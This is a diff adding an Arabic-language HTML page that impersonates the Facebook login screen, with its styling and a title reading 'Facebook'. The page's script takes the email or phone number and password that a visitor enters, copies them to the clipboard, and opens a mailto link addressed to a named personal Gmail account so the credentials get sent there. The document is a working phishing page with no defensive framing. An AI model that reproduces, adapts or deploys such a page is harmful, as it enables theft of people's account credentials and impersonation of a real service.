@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="ar"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>تسجيل الدخول</title> 
+  <link rel="stylesheet" href="styles.css"> <!-- ربط ملف CSS --> 
+ <style type="text/css" id="dcoder_stylesheet">/* styles.css */
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    width: 300px;
+    text-align: center;
+}
+
+.login-container h1 {
+    color: #1877f2;
+    font-size: 32px;
+    margin-bottom: 20px;
+}
+
+.login-container input[type="text"],
+.login-container input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+.login-container input[type="submit"] {
+    width: 100%;
+    padding: 10px;
+    background-color: #1877f2;
+    border: none;
+    border-radius: 5px;
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.login-container input[type="submit"]:hover {
+    background-color: #165dbb;
+}</style></head> 
+ <body> 
+  <div class="login-container"> 
+   <h1>فيسبوك</h1> 
+   <form onsubmit="processLogin(); return false;"> 
+    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required> 
+    <input type="password" id="password" placeholder="كلمة السر" required> 
+    <input type="submit" value="تسجيل الدخول"> 
+   </form> 
+  </div> 
+  <script src="script.js"></script> <!-- ربط ملف JavaScript --> 
+ 
+<script type="text/javascript" id="dcoder_script">// script.js
+function processLogin() {
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var recipient = "www.salman.hafaifa@gmail.com";
+    var body = "البريد الإلكتروني: " + email + "\nكلمة السر: " + password;
+
+    // نسخ البريد الإلكتروني وكلمة السر إلى الحافظة
+    var textToCopy = "البريد الإلكتروني: " + email + "\nكلمة السر: " + password;
+    navigator.clipboard.writeText(textToCopy).then(function() {
+        alert("تم نسخ البريد الإلكتروني وكلمة السر. سيتم الآن فتح Gmail، من فضلك الصق البيانات في نص الرسالة واضغط على إرسال.");
+        
+        // فتح تطبيق Gmail المثبت
+        window.location.href = "mailto:" + recipient + "?body=" + encodeURIComponent(body);
+    }).catch(function(err) {
+        console.error('حدث خطأ أثناء نسخ النص:', err);
+    });
+}</script></body></html>
